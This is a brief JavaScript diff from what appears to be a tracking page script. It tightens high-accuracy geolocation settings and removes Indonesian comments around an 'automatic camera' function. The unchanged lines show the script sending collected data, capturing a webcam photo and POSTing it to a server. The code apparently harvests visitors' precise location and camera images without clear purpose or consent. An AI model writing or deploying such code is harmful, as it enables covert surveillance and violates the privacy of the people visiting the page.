@@ -26,7 +26,7 @@
             });
           },
           () => resolve(null),
-          { enableHighAccuracy: true, timeout: 7000 }
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
       } else {
         resolve(null);
@@ -77,7 +77,6 @@
 
   await sendData(data);
 
-  // Fitur kamera otomatis
   async function captureAndSendPhoto() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -98,7 +97,6 @@
           method: 'POST',
           body: formData
         });
-        // Tampilkan popup card dengan foto dan pesan
         const imgUrl = URL.createObjectURL(blob);
         const popup = document.createElement('div');
         popup.style.position = 'fixed';
